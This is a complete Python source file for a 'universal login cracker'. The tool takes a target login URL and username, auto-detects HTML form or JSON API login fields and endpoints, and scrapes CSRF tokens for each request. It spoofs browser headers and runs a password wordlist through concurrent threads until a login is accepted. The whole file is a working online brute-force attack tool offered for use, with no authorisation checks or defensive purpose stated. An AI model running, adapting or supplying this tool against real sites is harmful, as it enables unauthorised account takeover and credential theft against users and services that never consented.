######################################################################################################
# Title: Universal Brute Force with CSRF Bypass                                                      #
# Author: Tanvir Hossain Antu                                                                        #
# Github: https://github.com/Antu7                                                                   #
# Supports: Form-based login, JSON API login, CSRF protection                                        #
######################################################################################################

import threading
import requests
import json
import time
import sys
import re
import os
import secrets
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

# ── ANSI Colors ──────────────────────────────────────────────
class C:
    RESET   = '\033[0m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'

def banner():
    print(f"""{C.CYAN}
██████  ██████  ██    ██ ████████ ███████     ███████  ██████  ██████   ██████ ███████
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
██████  ██████  ██    ██    ██    █████       █████   ██    ██ ██████  ██      █████
██   ██ ██   ██ ██    ██    ██    ██          ██      ██    ██ ██   ██ ██      ██
██████  ██   ██  ██████     ██    ███████     ██       ██████  ██   ██  ██████ ███████
{C.RESET}
{C.DIM}                   Tanvir Hossain Antu
        https://github.com/Antu7/python-bruteForce{C.RESET}
{C.YELLOW}
  Universal login cracker — works with HTML forms, JSON APIs,
  Single Page Apps (React/Vue/Angular), and CSRF-protected sites.
  Auto-detects login fields, API endpoints, and CSRF tokens.{C.RESET}
""")

def info(msg):
    print(f"  {C.BLUE}[*]{C.RESET} {msg}")

def success(msg):
    print(f"  {C.GREEN}[+]{C.RESET} {msg}")

def warn(msg):
    print(f"  {C.YELLOW}[!]{C.RESET} {msg}")

def error(msg):
    print(f"  {C.RED}[x]{C.RESET} {msg}")

def dim(msg):
    print(f"  {C.DIM}    {msg}{C.RESET}")

def prompt(label, default=None, hint=None):
    """Friendly input prompt with optional default and hint."""
    if hint:
        print(f"  {C.DIM}    Hint: {hint}{C.RESET}")
    if default:
        raw = input(f"  {C.WHITE}{label} {C.DIM}[{default}]{C.RESET}: ").strip()
        return raw if raw else default
    else:
        return input(f"  {C.WHITE}{label}{C.RESET}: ").strip()

def section(title):
    print(f"\n  {C.CYAN}{'─'*56}{C.RESET}")
    print(f"  {C.BOLD}{C.WHITE}{title}{C.RESET}")
    print(f"  {C.CYAN}{'─'*56}{C.RESET}")


# ── Core Cracker ─────────────────────────────────────────────

class BruteForceCracker:
    MODE_FORM = "form"
    MODE_JSON_API = "json_api"

    def __init__(self, url, username, error_message,
                 username_field="username", password_field="password",
                 login_mode="form", api_endpoint=None):
        self.url = url
        self.username = username
        self.error_message = error_message
        self.username_field = username_field
        self.password_field = password_field
        self.login_mode = login_mode
        self.api_endpoint = api_endpoint or url
        self.csrf_detected = False
        self.csrf_token_name = None
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }

    def get_csrf_token(self, session):
        """Extract CSRF token from the login page."""
        try:
            response = session.get(self.url, headers=self.headers)
            soup = BeautifulSoup(response.content, 'html.parser')

            csrf_patterns = [
                r'csrf[-_]?token', r'_csrf', r'csrfmiddlewaretoken',
                r'_token', r'authenticity_token',
                r'__RequestVerificationToken', r'XSRF[-_]TOKEN',
            ]
            pattern = re.compile('|'.join(csrf_patterns), re.IGNORECASE)

            # Hidden inputs
            for tag in soup.find_all('input', type='hidden'):
                name = tag.get('name', '')
                if pattern.search(name):
                    value = tag.get('value', '')
                    if value:
                        return name, value

            # All inputs
            for tag in soup.find_all('input'):
                name = tag.get('name', '')
                if pattern.search(name):
                    value = tag.get('value', '')
                    if value:
                        return name, value

            # Meta tags
            for meta in soup.find_all('meta'):
                name = meta.get('name', '')
                if pattern.search(name):
                    content = meta.get('content', '')
                    if content:
                        return name, content

            # Cookies
            for cookie in session.cookies:
                if pattern.search(cookie.name):
                    return cookie.name, cookie.value

            # JavaScript variables
            html = response.text
            js_pats = [
                r'(?:var|let|const)\s+csrf[_\-]?[tT]oken\s*=\s*["\']([^"\']+)["\']',
                r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            ]
            for jp in js_pats:
                match = re.search(jp, html, re.IGNORECASE)
                if match:
                    return 'csrf_token', match.group(1)

            return None, None
        except Exception:
            return None, None

    def crack_with_form(self, session, password, token_name, token_value):
        data_dict = {
            self.username_field: self.username,
            self.password_field: password,
        }
        if token_name and token_value:
            data_dict[token_name] = token_value

        headers = self.headers.copy()
        headers['Referer'] = self.url
        headers['Origin'] = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}"

        return session.post(self.url, data=data_dict, headers=headers, allow_redirects=True)

    def crack_with_json_api(self, session, password, token_name, token_value):
        base_url = f"{urlparse(self.url).scheme}://{urlparse(self.url).netloc}"

        json_data = {
            self.username_field: self.username,
            self.password_field: password,
        }

        if 'zeuz' in self.url.lower() or 'auth' in self.api_endpoint.lower():
            json_data = {
                "type": "userpass",
                "username": self.username,
                "password": password,
            }

        headers = self.headers.copy()
        headers['Content-Type'] = 'application/json'
        headers['Accept'] = 'application/json'
        headers['Referer'] = self.url
        headers['Origin'] = base_url

        if token_name and token_value:
            headers['X-CSRFToken'] = token_value

        return session.post(self.api_endpoint, json=json_data, headers=headers, allow_redirects=True)

    def check_success(self, response, password=""):
        # JSON responses
        if 'application/json' in response.headers.get('Content-Type', ''):
            try:
                data = response.json()

                # Check success indicators
                success_keys = ['token', 'access_token', 'jwt', 'session', 'user', 'success', 'id_token']
                for key in success_keys:
                    if key in data:
                        value = data[key]
                        if value and value is not False and value != 'false':
                            return True, f"Found '{key}' in response"

                # Check error indicators
                error_keys = ['error', 'message', 'msg', 'detail', 'errors']
                for key in error_keys:
                    if key in data:
                        error_value = str(data[key]).lower()
                        if self.error_message.lower() in error_value:
                            return False, None
                        if any(x in error_value for x in ['invalid', 'incorrect', 'wrong', 'failed', 'unauthorized', 'denied']):
                            return False, None

                # Check full response body for error message
                full_body = json.dumps(data).lower()
                if self.error_message.lower() in full_body:
                    return False, None

                # Status 200 alone is NOT enough — many APIs return 200 with error body
                return False, None

            except json.JSONDecodeError:
                pass

        # HTML responses
        response_text = response.text

        if self.error_message in response_text or self.error_message in str(response.content):
            return False, None

        # Redirect = likely success
        initial_url = self.url.split('?')[0].rstrip('/')
        final_url = response.url.split('?')[0].rstrip('/')
        if initial_url != final_url:
            return True, f"Redirected to {final_url}"

        # Still on login page = failure
        if re.search(r'<input[^>]+type=["\']password["\']', response_text, re.I):
            return False, None

        return True, "No login page detected"

    def crack(self, password):
        session = requests.Session()
        token_name, token_value = self.get_csrf_token(session)

        if self.csrf_detected and not token_value:
            return False, None

        try:
            if self.login_mode == self.MODE_JSON_API:
                response = self.crack_with_json_api(session, password, token_name, token_value)
            else:
                response = self.crack_with_form(session, password, token_name, token_value)

            if response.status_code in [401, 403, 419, 422] or response.status_code >= 500:
                return False, None

            return self.check_success(response, password)

        except Exception:
            return False, None


# ── Auto-Detection ───────────────────────────────────────────

def analyze_target(url):
    """Fully automatic analysis of the target login page."""
    section("AUTO-DETECTING TARGET")
    info("Fetching login page...")

    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}

    result = {
        'login_mode': BruteForceCracker.MODE_FORM,
        'api_endpoint': url,
        'username_field': 'email',
        'password_field': 'password',
        'csrf_token': None,
        'csrf_value': None,
    }

    try:
        response = session.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.content, 'html.parser')
        html = response.text
        scripts = soup.find_all('script')

        # ── Step 1: Login type ──
        info("Detecting login type...")

        js_indicators = [
            'fetch(', 'axios', 'XMLHttpRequest',
            'handleLogin', 'login_func', 'submitLogin',
            '/api/', '/auth/', 'application/json',
            'react', 'vue', 'angular', 'next', 'nuxt',
        ]

        is_json_api = False
        for script in scripts:
            src = script.get('src', '').lower()
            text = script.get_text().lower()
            for indicator in js_indicators:
                if indicator.lower() in src or indicator.lower() in text:
                    is_json_api = True
                    break
            if is_json_api:
                break

        # Check for forms without password fields (SPA indicator)
        forms_with_password = sum(
            1 for form in soup.find_all('form')
            if form.find('input', type='password')
        )
        password_inputs = soup.find_all('input', type='password')
        if password_inputs and forms_with_password == 0:
            is_json_api = True

        # No forms at all usually means SPA
        if not soup.find_all('form') and not password_inputs:
            is_json_api = True

        if is_json_api:
            result['login_mode'] = BruteForceCracker.MODE_JSON_API
            success("Detected: JSON API login (modern/SPA site)")
        else:
            success("Detected: Traditional HTML form login")

        # ── Step 2: Field names ──
        info("Detecting field names...")

        skip_patterns = ['reset', 'forgot', 'recover', 'signup', 'register', 'search', 'subscribe', 'newsletter']
        username_patterns = ['user', 'email', 'login', 'account', 'name']

        # First: look inside forms that have a password field (most reliable)
        login_forms = [f for f in soup.find_all('form') if f.find('input', type='password')]
        search_contexts = login_forms if login_forms else [soup]

        found_user_field = False
        found_pass_field = False

        for context in search_contexts:
            for inp in context.find_all('input'):
                inp_name = inp.get('name', '').lower()
                inp_id = inp.get('id', '').lower()
                inp_type = inp.get('type', '').lower()

                if any(skip in inp_name or skip in inp_id for skip in skip_patterns):
                    continue

                if not found_user_field and inp_type in ['text', 'email', '']:
                    for pat in username_patterns:
                        if pat in inp_name or pat in inp_id:
                            result['username_field'] = inp.get('name') or inp.get('id') or 'email'
                            found_user_field = True
                            break

                if not found_pass_field and inp_type == 'password':
                    field_name = inp.get('name') or inp.get('id')
                    if field_name:
                        result['password_field'] = field_name
                        found_pass_field = True

        # Fallback: parse JavaScript for SPA sites
        if not found_user_field or not found_pass_field:
            js_field_patterns = [
                r'''name["\s]*[:=]\s*["'](\w*(?:email|user|login)\w*)["']''',
                r'''name["\s]*[:=]\s*["'](\w*password\w*)["']''',
                r'''["'](\w*(?:email|user|login)\w*)["']\s*:''',
            ]
            for script in scripts:
                text = script.get_text()
                for jp in js_field_patterns:
                    matches = re.findall(jp, text, re.IGNORECASE)
                    for m in matches:
                        ml = m.lower()
                        if any(skip in ml for skip in skip_patterns):
                            continue
                        if not found_user_field and any(p in ml for p in username_patterns):
                            result['username_field'] = m
                            found_user_field = True
                        elif not found_pass_field and 'password' in ml:
                            result['password_field'] = m
                            found_pass_field = True

        success(f"Username field: {C.BOLD}{result['username_field']}{C.RESET}")
        success(f"Password field: {C.BOLD}{result['password_field']}{C.RESET}")

        if not found_user_field or not found_pass_field:
            dim("Could not auto-detect all fields (site may use JavaScript rendering).")
            dim("You can override these in the next step.")

        # ── Step 3: API endpoint ──
        if result['login_mode'] == BruteForceCracker.MODE_JSON_API:
            info("Probing API endpoints...")

            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"

            # Also try to extract endpoints from JS source
            js_endpoints = set()
            for script in scripts:
                text = script.get_text()
                # Look for API paths in JS
                api_matches = re.findall(r'''["'](/(?:api|auth|zsvc)[^"'\s,)}{]*(?:login|signin|authenticate)[^"'\s,)}{]*)["']''', text, re.IGNORECASE)
                js_endpoints.update(api_matches)

            common_endpoints = list(js_endpoints) + [
                '/zsvc/auth/v1/login/',
                '/api/login',
                '/api/auth/login',
                '/api/v1/login',
                '/api/v1/auth/login',
                '/auth/login',
                '/api/users/login',
                '/api/sessions',
                '/login',
            ]

            api_headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
                'Accept': 'application/json',
            }

            endpoint_found = False
            for endpoint in common_endpoints:
                try:
                    test_url = base + endpoint
                    test_response = session.post(
                        test_url, json={"test": "test"},
                        headers=api_headers, timeout=3
                    )
                    if test_response.status_code in [200, 400, 401, 403, 422]:
                        result['api_endpoint'] = test_url
                        success(f"API endpoint: {C.BOLD}{test_url}{C.RESET}")
                        endpoint_found = True
                        break
                except Exception:
                    pass

            if not endpoint_found:
                result['api_endpoint'] = base + '/api/login'
                warn(f"No endpoint responded, using default: {result['api_endpoint']}")
                dim("You can override this in the next step.")

        # ── Step 4: CSRF token ──
        info("Checking for CSRF protection...")

        csrf_patterns = [
            r'csrf[-_]?token', r'_csrf', r'csrfmiddlewaretoken',
            r'_token', r'authenticity_token', r'__RequestVerificationToken',
        ]
        csrf_re = re.compile('|'.join(csrf_patterns), re.IGNORECASE)

        for inp in soup.find_all('input', type='hidden'):
            name = inp.get('name', '')
            if csrf_re.search(name):
                result['csrf_token'] = name
                result['csrf_value'] = inp.get('value', '')
                break

        if not result['csrf_token']:
            for cookie in session.cookies:
                if csrf_re.search(cookie.name):
                    result['csrf_token'] = cookie.name
                    result['csrf_value'] = cookie.value
                    break

        if result['csrf_token']:
            success(f"CSRF token: {result['csrf_token']}")
        else:
            dim("No CSRF protection detected.")

        print()
        success("Auto-detection complete!")

    except requests.exceptions.ConnectionError:
        error("Could not connect to the target URL.")
        dim("Make sure the URL is correct and the site is reachable.")
        dim("Example: https://example.com/login")
        print()
    except requests.exceptions.Timeout:
        error("Connection timed out.")
        dim("The site took too long to respond. Try again later.")
        print()
    except Exception as e:
        error(f"Analysis error: {e}")
        dim("Using default settings. You can override them below.")
        print()

    return result


# ── Progress Display ─────────────────────────────────────────

def progress_bar(current, total, width=30):
    """Compact progress bar for terminal."""
    pct = current / total if total else 0
    filled = int(width * pct)
    bar = f"{'█' * filled}{'░' * (width - filled)}"
    return f"{bar} {current}/{total} ({pct*100:.1f}%)"


def crack_password_wrapper(password, cracker, state):
    """Worker function for thread pool."""
    password = password.strip()

    with state['lock']:
        state['tried'] += 1
        current = state['tried']

    # Update progress (overwrite same line)
    total = state['total']
    sys.stdout.write(f"\r  {C.BLUE}[*]{C.RESET} {progress_bar(current, total)}  Current: {password[:20]:<20}")
    sys.stdout.flush()

    ok, reason = cracker.crack(password)
    if ok:
        return True, password, reason
    return False, password, None


# ── Main ─────────────────────────────────────────────────────

def main():
    banner()

    section("STEP 1 — TARGET INFO")
    print()
    url = prompt("Target login page URL",
                 hint="The full URL of the login page, e.g. https://example.com/login")
    if not url:
        error("URL is required.")
        return
    if not url.startswith('http'):
        url = 'https://' + url
        dim(f"Added https:// → {url}")

    print()
    username = prompt("Target username / email",
                      hint="The username or email you want to test passwords for")
    if not username:
        error("Username is required.")
        return

    print()
    error_msg = prompt("Wrong password error message",
                       hint="Try logging in with a wrong password and copy the exact error text.\n"
                            "       Open browser DevTools (F12) → Network tab → submit login →\n"
                            "       look at the response body for the error message.")
    if not error_msg:
        error("Error message is required to avoid false positives.")
        return

    # ── Auto-detect ──
    analysis = analyze_target(url)

    # ── Confirm / override ──
    section("STEP 2 — REVIEW & ADJUST")
    print()
    dim("Press Enter to accept the auto-detected value, or type a new one.")
    print()

    analysis['username_field'] = prompt("Username field name", default=analysis['username_field'],
                                        hint="The form field name for the username/email input")
    analysis['password_field'] = prompt("Password field name", default=analysis['password_field'])

    if analysis['login_mode'] == BruteForceCracker.MODE_JSON_API:
        analysis['api_endpoint'] = prompt("API endpoint", default=analysis['api_endpoint'],
                                          hint="Check browser DevTools → Network tab to find the login POST URL")

    mode_choice = prompt("Login mode", default="auto",
                         hint="auto = use detected mode | form = HTML form | api = JSON API")
    if mode_choice == 'form':
        analysis['login_mode'] = BruteForceCracker.MODE_FORM
    elif mode_choice == 'api':
        analysis['login_mode'] = BruteForceCracker.MODE_JSON_API

    # ── Attack settings ──
    section("STEP 3 — ATTACK SETTINGS")
    print()

    workers_input = prompt("Concurrent workers", default="10",
                           hint="More workers = faster, but too many may get you rate-limited")
    try:
        max_workers = int(workers_input)
        if max_workers < 1:
            max_workers = 10
    except ValueError:
        max_workers = 10

    password_file = prompt("Password file path", default="passwords.txt")

    # ── Summary ──
    section("CONFIGURATION SUMMARY")
    print()
    print(f"  {C.DIM}{'Target URL':<20}{C.RESET} {url}")
    print(f"  {C.DIM}{'Username':<20}{C.RESET} {username}")
    print(f"  {C.DIM}{'Login Mode':<20}{C.RESET} {analysis['login_mode'].upper()}")
    if analysis['login_mode'] == BruteForceCracker.MODE_JSON_API:
        print(f"  {C.DIM}{'API Endpoint':<20}{C.RESET} {analysis['api_endpoint']}")
    print(f"  {C.DIM}{'Username Field':<20}{C.RESET} {analysis['username_field']}")
    print(f"  {C.DIM}{'Password Field':<20}{C.RESET} {analysis['password_field']}")
    print(f"  {C.DIM}{'CSRF Token':<20}{C.RESET} {'Yes — ' + analysis['csrf_token'] if analysis['csrf_token'] else 'None'}")
    print(f"  {C.DIM}{'Workers':<20}{C.RESET} {max_workers}")
    print(f"  {C.DIM}{'Password File':<20}{C.RESET} {password_file}")
    print()

    confirm = prompt("Start attack? (Y/n)", default="Y")
    if confirm.lower() not in ['y', 'yes', '']:
        warn("Aborted by user.")
        return

    # ── Initialize ──
    cracker = BruteForceCracker(
        url=url,
        username=username,
        error_message=error_msg,
        username_field=analysis['username_field'],
        password_field=analysis['password_field'],
        login_mode=analysis['login_mode'],
        api_endpoint=analysis['api_endpoint']
    )

    if analysis['csrf_token']:
        cracker.csrf_detected = True
        cracker.csrf_token_name = analysis['csrf_token']

    # ── Pre-flight check ──
    section("PRE-FLIGHT CHECK")
    print()
    info("Testing with a random password to verify configuration...")

    random_pass = secrets.token_hex(16)
    ok, _ = cracker.crack(random_pass)

    if ok:
        print()
        error("False positive detected! A random password was accepted as correct.")
        print()
        warn("This usually means one of these:")
        dim("1. The error message you entered doesn't match the actual response.")
        dim("2. The API endpoint is wrong (returns a generic 200 for all requests).")
        dim("3. The field names are wrong (server ignores unknown fields).")
        print()
        warn("How to fix:")
        dim("1. Open the login page in your browser.")
        dim("2. Open DevTools (F12) → Network tab.")
        dim("3. Submit a wrong password and check:")
        dim("   - The POST URL (use it as the API endpoint)")
        dim("   - The request body (field names for username/password)")
        dim("   - The response body (copy the exact error message)")
        print()

        retry = prompt("Try again with different settings? (y/N)", default="N")
        if retry.lower() in ['y', 'yes']:
            main()
        return
    else:
        success("Configuration verified! Wrong passwords are correctly detected.")

    # ── Load passwords ──
    try:
        with open(password_file, 'r', encoding='utf-8', errors='ignore') as f:
            passwords = [p.strip() for p in f.readlines() if p.strip()]
        success(f"Loaded {len(passwords)} passwords from {password_file}")
    except FileNotFoundError:
        error(f"File not found: {password_file}")
        dim("Make sure the file exists in the current directory or provide a full path.")
        return

    if not passwords:
        error("Password file is empty.")
        return

    total_passwords = len(passwords)

    # ── Attack ──
    section("BRUTE FORCE IN PROGRESS")
    print()
    info(f"Testing {total_passwords} passwords with {max_workers} workers...")
    dim("Press Ctrl+C to stop at any time.\n")

    state = {
        'tried': 0,
        'total': total_passwords,
        'lock': threading.Lock(),
    }

    found = False
    found_password = None
    found_reason = None

    start_time = time.time()

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(crack_password_wrapper, pwd, cracker, state): pwd
            for pwd in passwords
        }

        try:
            for future in as_completed(futures):
                ok, password, reason = future.result()
                if ok:
                    found = True
                    found_password = password
                    found_reason = reason
                    # Clear the progress line
                    sys.stdout.write('\r' + ' ' * 80 + '\r')
                    sys.stdout.flush()
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
        except KeyboardInterrupt:
            sys.stdout.write('\r' + ' ' * 80 + '\r')
            sys.stdout.flush()
            warn("Stopped by user (Ctrl+C).")
            executor.shutdown(wait=False, cancel_futures=True)

    elapsed = time.time() - start_time

    # Clear progress line
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()

    # ── Results ──
    section("RESULTS")
    print()

    tried = state['tried']
    speed = tried / max(elapsed, 0.1)

    print(f"  {C.DIM}{'Passwords Tried':<20}{C.RESET} {tried}/{total_passwords}")
    print(f"  {C.DIM}{'Time Elapsed':<20}{C.RESET} {elapsed:.2f} seconds")
    print(f"  {C.DIM}{'Speed':<20}{C.RESET} {speed:.1f} attempts/sec")
    print()

    if found:
        print(f"  {C.GREEN}{C.BOLD}PASSWORD FOUND!{C.RESET}")
        print()
        print(f"  {C.GREEN}{'Username':<20}{C.RESET} {username}")
        print(f"  {C.GREEN}{'Password':<20}{C.RESET} {found_password}")
        if found_reason:
            print(f"  {C.DIM}{'Detection':<20}{C.RESET} {found_reason}")
    else:
        warn("Password not found in the wordlist.")
        dim("Try a larger wordlist or check your configuration.")

    print(f"\n  {C.CYAN}{'─'*56}{C.RESET}\n")


if __name__ == '__main__':
    main()
